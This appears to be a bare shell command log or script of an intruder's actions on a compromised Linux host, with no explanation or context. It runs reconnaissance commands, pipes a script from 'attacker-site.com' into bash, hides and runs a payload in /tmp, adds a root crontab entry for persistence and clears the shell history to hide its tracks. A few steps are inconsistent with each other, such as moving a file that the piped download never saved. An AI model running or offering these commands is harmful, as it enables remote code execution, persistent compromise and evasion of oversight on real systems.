whoami
uname -a
curl -s http://attacker-site.com/setup.sh | bash
mv /tmp/setup.sh /tmp/.cache_proc
chmod +x /tmp/.cache_proc
./tmp/.cache_proc &
echo "*/5 * * * * root /tmp/.cache_proc" >> /etc/crontab
history -c
exit